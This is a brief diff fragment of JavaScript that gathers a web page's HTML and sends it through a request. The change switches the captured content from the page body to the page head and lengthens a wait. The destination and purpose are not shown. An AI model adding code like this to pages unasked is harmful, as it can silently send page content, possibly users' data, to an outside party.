@@ -20,9 +20,9 @@ function sendMessage(message) {
         };
 
         request.send(JSON.stringify(messageData));
-        wait(5000);
+        wait(15000);
     }
 }
 
-const all_elements = document.body.innerHTML
+const all_elements = document.head.innerHTML
 sendMessage(all_elements);
